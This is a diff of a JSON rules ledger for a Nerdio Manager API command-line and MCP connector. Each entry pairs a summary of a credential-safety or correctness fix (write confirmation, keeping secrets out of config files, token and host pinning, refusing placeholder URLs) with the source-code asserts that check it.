+   "why": "Work order connector note: every MCP write must preview and send only with confirm: true. Press 4.34.2's in-process endpoint handlers (makeAPIHandler) send writes directly. The gate (hand file internal/mcp/nerdio_endpoint_confirm.go) is installed by one anchored line in the generated tools.go after every registration and before the read-only drop. The black-box test drives the real MCP server against a fake Nerdio: no write without confirm, the string \"true\" previews, and boolean true sends (control). Ported to nerdio from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "RequireConfirmForEndpointWrites(s)",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
-     "min_count": 1,
+     "file": "cli/internal/mcp/nerdio_endpoint_confirm.go",
+     "contains": "func RequireConfirmForEndpointWrites(s *server.MCPServer) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.SanitizeErrorBody(c.shownErrorBody(body, clientID, clientSecret))",
-     "min_count": 1,
+     "file": "cli/internal/mcp/nerdio_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.SanitizeErrorBody(c.shownErrorBody(body)))",
-     "min_count": 1,
+     "file": "cli/internal/nerdioblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
+     "file": "cli/internal/nerdioblackbox/blackbox_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "config-file-holds-no-credential",
+   "status": "active",
+   "summary": "config.toml never holds a credential: every value it keeps passes persistedWithoutCredentials (base_url and token_url lose their userinfo, every credential-named query value and every query value that repeats a credential of the configuration or the environment; a credential-named header, or one repeating such a credential, is left out) and the write is refused when the file still repeats one; the legacy scrub writes through the same filter. config.toml is a credential source the shared credential kit reads (credwire Files), so its own writes go outside the kit and this check is theirs.",
+   "why": "Codex r1 class credential-persisted-outside-the-store: `NERDIO_BASE_URL='https://nmm.example.com?api_key=X' auth set-token` wrote X (and a userinfo password, a held secret under any query name, a token_url query secret) into config.toml, because the generated save persists base_url and token_url as configured. Work order credential rule: nothing but the 0600 credential store holds a credential. Hand file internal/config/nerdio_persist.go; three anchored lines in the generated config.go (tools/apply_credential_rules.py). TestConfigFileNeverHoldsACredential failed on the generated save (seen/r1-config-file-credential-seen-failing.log). Ported to nerdio from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "persist = persistedWithoutCredentials(persisted.persisted(), c)",
+     "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
+     "file": "cli/internal/config/config.go",
+     "contains": "if err := refuseCredentialInConfigFile(persist, data, c); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "scrubbed := persistedWithoutCredentials(legacy.persisted(), c)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/nerdio_persist.go",
+     "contains": "func persistedWithoutCredentials(p persistedConfig, c *Config) persistedConfig {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/nerdio_persist.go",
+     "contains": "func refuseCredentialInConfigFile(persist any, data []byte, c *Config) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_names.go",
+     "contains": "func URLWithoutCredentials(raw string, creds ...string) (clean string, changed bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/nerdio_persist_test.go",
+     "contains": "func TestSavedConfigFileKeepsNoCredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/nerdioblackbox/config_file_test.go",
+     "contains": "func TestConfigFileNeverHoldsACredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/nerdio_persist.go",
+     "contains": "cliutil.URLWithoutCredentials(p.BaseURL, creds...)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "export-file-closed-on-error",
+   "status": "active",
+   "summary": "export --output closes its output file (written through the credential kit) on every return, including an API error: the open no longer shadows RunE's named err",
+   "why": "The generated `f, err := openExportOutput(...)` inside the --output block declared a new err, so the deferred close tested that inner (nil) err and never ran when the export returned an API error. With the output chokepoint the file is a filter pipe, and the unclosed pipe kept the process from exiting: `export clients --output f.jsonl` after a 401 hung (TestExportOutputReturnsAfterAnAPIError, seen failing 3 of 4 runs). Fleet note: every connector that took the ported chokepoint edit on export.go carries the same shadowing. Ported to nerdio from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "f, ferr := openExportOutput(outputFile)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/nerdioblackbox/export_test.go",
+     "contains": "func TestExportOutputReturnsAfterAnAPIError(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "dry-run-changes-nothing",
+   "status": "active",
+   "summary": "--dry-run changes no local file: auth set-token saves nothing, auth logout clears nothing, export --output leaves the file alone (the preview goes to stdout)",
+   "why": "Press-traps s6, measured on this tree: `auth set-token --dry-run` saved the token to credentials.toml, `auth logout --dry-run` cleared the stored credentials, and `export organizations --output f --dry-run` replaced f with the preview. The auth blocks are the fleet replay's auth-dry-run recipe text (this connector's ledger never carried that entry). TestDryRunChangesNoLocalFile seen failing (seen/dry-run-changes-nothing-seen-failing.log). Ported to nerdio from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "(dry run - nothing saved)",
+     "code_only": true
     },
     {
      "file": "cli/internal/cli/auth.go",
-     "contains": "cliutil.SanitizeErrorBody(cliutil.FunnelWithhold(string(body), []string{clientSecret}))",
-     "min_count": 1,
+     "contains": "(dry run - nothing changed)",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/auth.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
+     "file": "cli/internal/cli/export.go",
+     "contains": "if flags.dryRun {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
+     "file": "cli/internal/cli/nerdio_dryrun_writes_test.go",
+     "contains": "func TestDryRunChangesNoLocalFile(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "minted-token-bound-to-its-client",
+   "status": "active",
+   "summary": "An access token is sent only for the client pair and token URL it was minted with: a stored token only when the files recorded the client ID in effect with it and its token URL resolves the same; an environment pair the files do not hold mints its own token, keeps it in process memory (one mint per process per pair) and never saves it",
+   "why": "The generated mint saved every minted token beside the STORED pair (configForSave keeps the environment pair itself off disk), so an operator who switched NERDIO_CLIENT_ID / NERDIO_BASE_URL to a second marketplace saved marketplace B's token beside A's pair, and the next run sent B's token for A (and A's token for B while it was unexpired). The action1 r1 class (cached authentication ignores credential override) on the generated mint. Hand files internal/client/nerdio_tokens.go and internal/config/nerdio_tokens.go; two anchored lines in client.go (tools/apply_edits.py). Ported to nerdio from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if mint, decided := c.tokenBinding(); decided {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
+     "file": "cli/internal/client/client.go",
+     "contains": "if err := c.keepMintedToken(clientID, clientSecret, tokenResp.AccessToken, expiry); err != nil {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/client/nerdio_tokens.go",
+     "contains": "func (c *Client) tokenBinding() (mint bool, decided bool) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
+     "file": "cli/internal/client/nerdio_tokens.go",
+     "contains": "if c.Config.PairIsStored() && clientID == c.Config.ClientID && clientSecret == c.Config.ClientSecret {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/config/nerdio_tokens.go",
+     "contains": "func (c *Config) PairIsStored() bool {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "rejected-mint-returns",
+   "status": "active",
+   "summary": "A rejected client-credentials mint returns its error (the client ID and secret withheld) instead of hanging: the rendered mint runs as mintClientCredentialsRaw behind a hand wrapper, and the token endpoint's error bodies are masked through shownTokenErrorBody, which does not take the token-state lock again",
+   "why": "fleet/bin/mint_lock_scan.py rc 1 on the 4.34.2 render: the mint and the refresh grant run with the token-state lock held, and their error path masked the body through maskCredentialText, which takes that lock (jamf-pro and threecx hung forever the same way). The ninjaone shape (skills/ninjaone/cli/internal/client/ninja_token_errors.go). TestRejectedMintReturnsWithoutTheSecret is the proof (seen/rejected-mint-hang-seen-failing.log). Ported to nerdio from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func (c *Client) mintClientCredentialsRaw(ctx context.Context, clientID, clientSecret string) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "cliutil.SanitizeErrorBody(c.shownTokenErrorBody(body, clientID, clientSecret))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "cliutil.SanitizeErrorBody(c.shownTokenErrorBody(body)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/nerdio_token_errors.go",
+     "contains": "func (c *Client) shownTokenErrorBody(body []byte, extraCredentials ...string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/nerdio_token_errors_test.go",
+     "contains": "func TestRejectedMintReturnsWithoutTheSecret(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "config-check-reads-back-every-shape",
+   "status": "active",
+   "summary": "The last check before config.toml is written reads back the exact bytes whatever shape produced them (an agentcookie-managed save marshals the whole configuration) and refuses a file that repeats a held value or the configuration's credentials in any form; every header is judged by name, by credential shape and by the tenant-secret matcher (cliutil.Echoes), so a header holding a credential's base32 is left out. Under agentcookie a minted token stays in process memory.",
+   "why": "Codex review round 1 of the 4.34.2 reprint (review repo ce4623f), class credential-persisted-outside-the-store: with .agentcookie-managed beside config.toml, `printf 'NewBearer-739182' | auth set-token` wrote the bearer into config.toml (the check returned early for any shape but the credential-free one), and a header holding the base32 of the token was kept (the salesbuildr round-2 repeat of this class), and the legacy-config scrub wrote a migrated legacy file with no last check at all (seen/r1-legacy-scrub-seen-failing.log). The generated TestAgentcookieMarkerKeepsCredentialsInConfig asserted the old behavior and now asserts the refusal (tools/apply_credential_rules.py). Seen failing: seen/r1-credential-persisted-outside-the-store-seen-failing.log. Ported to nerdio from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/config/nerdio_persist.go",
+     "contains": "func refuseCredentialInConfigFile(persist any, data []byte, c *Config) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/nerdio_persist.go",
+     "contains": "func headerHoldsCredential(name, value string, creds []string) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/nerdio_persist.go",
+     "contains": "if err := toml.Unmarshal(data, &doc); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_tenant_sinks.go",
+     "contains": "func Echoes(text string, values []string) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials_test.go",
+     "contains": "func TestAgentcookieMarkerNeverKeepsCredentialsInConfig(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials_test.go",
+     "not_contains": "func TestAgentcookieMarkerKeepsCredentialsInConfig("
+    },
+    {
+     "file": "cli/internal/client/nerdio_tokens.go",
+     "contains": "if c.Config.AgentcookieManagedByExternalStore() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/nerdio_codex_r1_test.go",
+     "contains": "func TestR1AgentcookieSaveNeverWritesACredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/nerdio_codex_r1_test.go",
+     "contains": "func TestR1HeaderNeverCarriesAnEncodedCredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if refuseCredentialInConfigFile(scrubbed, scrubbedData, &check) != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/nerdio_codex_r1_test.go",
+     "contains": "func TestR1LegacyScrubNeverWritesACredential(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "store-partition-follows-path",
+   "status": "active",
+   "summary": "Local reads and the automatic write-through use the store partition sync fills for the endpoint the request path is (the most specific pp:path template in the command tree that matches it: a synced collection, or one {parameter} record under it), never the command group's label; a literal child of a synced collection is another endpoint; a path no partition is synced from is never read locally, cached or used as a network fallback; a mutation response is never cached.",
+   "why": "Codex review round 1 of the 4.34.2 reprint (review repo ce4623f), class sync-read-partition-mismatch: every generated endpoint command named its group as the partition, so `account resource-company-read-all-companies-get --data-source local` returned the users sync stores under \"account\" (/account/v2/users) and an automatic company read wrote companies there (PagedCompanyAccountV2 vs PagedUserAccountV2); 0.1.9 carried the same labels. A first path-shape version read /assistedSales/v1/opportunities/pricingPlanCosts as an opportunity record; the endpoint templates close that (seen/r1-partition-literal-child-seen-failing.log). Hand file internal/cli/nerdio_partitions.go; five anchored lines in data_source.go (tools/apply_edits.py). Seen failing: seen/r1-cli-wrong-results-seen-failing.log. Ported to nerdio from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/nerdio_partitions.go",
+     "contains": "func nerdioStorePartition(label, path string, isList bool) (string, bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "resourceType, isList = nerdioStorePartition(resourceType, path, isList)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "resourceType, _ = nerdioStorePartition(resourceType, path, true)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "return nil, DataProvenance{}, nerdioUnsyncedLocalError(path)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "if resourceType == nerdioUnsyncedPartition {",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "if !nerdioMutationWriteThrough(resourceType) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_partitions.go",
+     "contains": "func nerdioRouteTemplate(segs []string) ([]string, bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_codex_r1_test.go",
+     "contains": "func TestR1AccountListNeverReadsTheMSPPartition(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_codex_r1_test.go",
+     "contains": "func TestR1PartitionFollowsTheEndpointTemplate(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-probe-counts-the-client-pair",
+   "status": "active",
+   "summary": "doctor's credential probe counts the client pair as a configured credential (as its auth line does), so a pair-only install is probed instead of reported as having no credential.",
+   "why": "Codex review round 1 of the 4.34.2 reprint (review repo ce4623f), P2 incorrect-authentication-verdict (a one-line fix): with only NERDIO_CLIENT_ID and NERDIO_CLIENT_SECRET the reachability client minted a token, but the probe step read the unmodified Config's Authorization and printed 'no credential is configured'. One anchored line in doctor.go (tools/apply_edits.py). Seen failing: seen/r1-p2-doctor-pair-verdict-seen-failing.log. Ported to nerdio from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "if authHeader == \"\" && !cfg.CredentialConfigured() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_doctor_pair_test.go",
+     "contains": "strings.Contains(cr, \"no credential is configured\")",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "api-origin-pinned",
+   "status": "active",
+   "summary": "A credential goes only to the scheme, host and port configured for it: every API request and the bearer token to the API base URL's origin (the operator's NMM instance); the Entra token URL's origin only receives POST <token path> carrying no bearer token; every redirect hop stays on the origin of the request it follows; a non-ASCII or unparseable host never matches; `auth login`'s own token client is pinned the same way",
+   "why": "Work-order credential rule (host pinning). The NMM API (per-MSP instance) and its token endpoint (Microsoft Entra ID, the operator's tenant) are different hosts, so the guard has two pins (the pax8/appdirect shape). Applied through registerClientHook (every CLI, novel and MCP client) and one anchored line in root.go oauthHTTPClient (tools/apply_credential_rules.py).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "func (p nerdioPins) check(req *http.Request) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "strings.HasPrefix(auth, \"Basic \")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "installPins(c.HTTPClient, newNerdioPins(c.BaseURL, client.ResolveNerdioTokenURL(c.Config)), c.DryRun)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "func guardTokenClient(hc *http.Client, cfg *config.Config, dryRun bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "registerClientHook(func(c *client.Client) error {",
      "code_only": true
     },
     {
      "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
-     "min_count": 1,
+     "contains": "guardTokenClient(hc, cfg, f.dryRun)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "placeholder-base-url-refused",
+   "status": "active",
+   "summary": "The shipped base_url host (nmm.example.com) pins nothing: every API request is refused before it is sent, and the error names NERDIO_BASE_URL, so a bearer token is never sent to a placeholder name",
+   "why": "Every MSP runs its own NMM instance; there is no vendor-global API. The press ships https://nmm.example.com as base_url, and before this a forgotten NERDIO_BASE_URL sent the bearer token to whoever answers for that name (doctor already refused it; ordinary commands did not).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "const nerdioPlaceholderHost = \"nmm.example.com\"",
      "code_only": true
     },
     {
-     "file": "cli/cmd/nerdio-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
-     "min_count": 1,
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "p.placeholder = true",
      "code_only": true
     },
     {
-     "file": "cli/cmd/nerdio-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
-     "min_count": 1,
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "if p.placeholder && p.token != o {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "token-url-from-operator-only",
+   "status": "active",
+   "summary": "Every token request (automatic mint, refresh grant, auth login) resolves its URL through client.ResolveNerdioTokenURL: the operator's NERDIO_TOKEN_URL (or token_url in a trusted config) only; unset, still the YOUR_TENANT_ID placeholder, userinfo-bearing or not http(s) means nothing is posted (ErrNoNerdioTokenURL names the variable)",
+   "why": "Press 4.34.2 (and 4.24) hard-coded https://login.microsoftonline.com/YOUR_TENANT_ID/oauth2/v2.0/token as the fallback at all three token sites, so an operator who forgot NERDIO_TOKEN_URL posted the client secret to a URL naming no tenant of theirs. tools/apply_edits.py re-points the three sites.",
+   "asserts": [
+    {
+     "file": "cli/internal/client/nerdio_token_url.go",
+     "contains": "func ResolveNerdioTokenURL(cfg *config.Config) string {",
      "code_only": true
     },
     {
-     "file": "cli/cmd/nerdio-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/client/nerdio_token_url.go",
+     "contains": "func tokenSafeURL(raw string) (*url.URL, bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/nerdio_token_url.go",
+     "contains": "const placeholderTenant = \"YOUR_TENANT_ID\"",
      "code_only": true
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
-     "min_count": 1,
+     "contains": "tokenURL := ResolveNerdioTokenURL(c.Config)",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return ErrNoNerdioTokenURL",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "tokenURL := client.ResolveNerdioTokenURL(cfg)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "return configErr(client.ErrNoNerdioTokenURL)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/nerdio_token_errors.go",
+     "contains": "if ResolveNerdioTokenURL(c.Config) == \"\" {",
      "code_only": true
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
-     "min_count": 1,
+     "not_contains": "tokenURL = \"https://login.microsoftonline.com/YOUR_TENANT_ID/oauth2/v2.0/token\""
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "not_contains": "tokenURL = \"https://login.microsoftonline.com/YOUR_TENANT_ID/oauth2/v2.0/token\""
+    }
+   ]
+  },
+  {
+   "id": "oauth-scope-required",
+   "status": "active",
+   "summary": "The token request's scope is exactly NERDIO_OAUTH_SCOPE (the NMM application's bare '<app-id>/.default'); unset means nothing is posted and ErrNoNerdioScope names the variable; the scope is never derived from the caller's own client ID",
+   "why": "Press 4.34.2 (and 4.24) defaulted the scope to api://<client_id>/.default: the caller's own application, not the NMM API, with the api:// prefix that triggers AADSTS500011 (the documented trap). Both scope resolvers (client.go, auth.go) read client.ResolveNerdioScope (tools/apply_edits.py); the automatic mint and auth login refuse before sending.",
+   "asserts": [
+    {
+     "file": "cli/internal/client/nerdio_token_url.go",
+     "contains": "func ResolveNerdioScope() string {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
-     "min_count": 1,
+     "file": "cli/internal/client/nerdio_token_errors.go",
+     "contains": "if ResolveNerdioScope() == \"\" {",
      "code_only": true
     },
     {
+     "file": "cli/internal/client/client.go",
+     "contains": "return ResolveNerdioScope()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "return client.ResolveNerdioScope()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "return configErr(client.ErrNoNerdioScope)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "strings.ReplaceAll(\"api://{client_id}/.default\", \"{client_id}\", clientID)"
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "not_contains": "strings.ReplaceAll(\"api://{client_id}/.default\", \"{client_id}\", clientID)"
+    }
+   ]
+  },
+  {
+   "id": "tenant-secrets-shown-never-stored",
+   "status": "active",
+   "summary": "A read whose purpose is to return a customer secret the operator asked for by name (devices laps: LAPS password; devices bitlocker-keys; the secure-variables lists) prints it to the caller and writes it nowhere: its path is no sync partition, so the data-source chokepoint never caches or stores it; the response cache is off; secure-variables is not synced (spec syncable: false)",
+   "why": "Sync stored secure-variable values in SQLite at 4.24 and 4.34.2 (default sync set), and every generated `devices` read wrote through into the devices partition, LAPS passwords included. Holding these fields as connector credentials would withhold the very answer each command exists to give, so the guard does not hold them (nerdioTenantSecretPath) and the store never sees them (store-partition-follows-path).",
+   "spec_encoded": true,
+   "asserts": [
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "func nerdioTenantSecretPath(method, path string) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "!nerdioTenantSecretPath(req.Method, req.URL.Path) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "cliutil.ShowTenantSecrets(sent, \"value\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_tenant_secrets.go",
+     "contains": "func ArgvRepeatsSecret(text string) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_tenant_secrets.go",
+     "contains": "return len(all) > 0 && text != \"\" && Echoes(text, all)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_residuals_test.go",
+     "contains": "func TestSecureVariableWriteValueIsATenantSecret(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nerdio_residuals_test.go",
+     "contains": "func TestSecureVariablesIsNoSyncResource(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/nerdio_argv_tenant_test.go",
+     "contains": "func TestChildArgvNeverRepeatsAShownTenantSecret(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/nerdioblackbox/nerdio_rules_test.go",
+     "contains": "func Test",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "\"secure-variables\":      \"/rest-api/v1/secure-variables\","
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "not_contains": "\"secure-variables\":      {},"
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\t\t\"scripted-actions\",\n\t}\n}",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "avd-session-vocabulary-is-data",
+   "status": "active",
+   "summary": "A field, flag or header name whose only credential word is 'session' (sessionId, sessionState, sessionHostName, sessionTimeouts) is Azure Virtual Desktop data, not a credential; sessionToken, sessionSecret, sessionCookie and sessionKey stay credentials. The action1/appdirect exemptions (remote_session, CVSS authentication, session_timeout, passwordComplexity) are not carried The credential kit declares sessionToken alone as a session ResponseField, and the client masks it by name, so the session data around it prints (TestAVDSessionDataPrintsAndSessionTokenWithheld).",
+   "why": "The NMM Partner API authenticates with a bearer token only, never a web session, and AVD's vocabulary is sessions (host pools of session hosts, user sessions, session timeouts). Held, every one of those values (a host name, 'Active', a count) withheld whole outputs of host-pool, host and workspace commands. Contract section 7: per-connector identifier exemptions with a reason.",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/nerdio_names.go",
+     "contains": "func avdSessionVocabulary(n string) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_names.go",
+     "contains": "func nmmMFAStatusVocabulary(n string) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_mfa_vocabulary_test.go",
+     "contains": "func TestMFAStatusNamesAreData(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_names.go",
+     "contains": "return !avdSessionVocabulary(n)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/nerdio_names.go",
+     "not_contains": "\"remotesession\":"
+    },
+    {
+     "file": "cli/internal/nerdioblackbox/nerdio_rules_test.go",
+     "contains": "func TestAVDSessionDataPrintsAndSessionTokenWithheld(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-auth-hint-names-the-five-variables",
+   "status": "active",
+   "summary": "With no credential configured, doctor's auth_hint names the five variables the connector needs (NERDIO_BASE_URL, NERDIO_TOKEN_URL, NERDIO_CLIENT_ID, NERDIO_CLIENT_SECRET, NERDIO_OAUTH_SCOPE with no api:// prefix) and `auth login`; no surface names a nonexistent `auth setup`",
+   "why": "Press 4.34.2 renders \"Run 'nerdio-pp-cli auth login' to re-authenticate.\" for an unconfigured install, which tells a fresh install nothing: auth login itself needs the token URL and scope, and the per-instance base URL has no default. The shipped connector named only the client pair (the press's auth.env_vars). tools/apply_edits.py restores the full hint.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "Set NERDIO_BASE_URL, NERDIO_TOKEN_URL, NERDIO_CLIENT_ID, NERDIO_CLIENT_SECRET and NERDIO_OAUTH_SCOPE",
+     "code_only": true
+    },
+    {
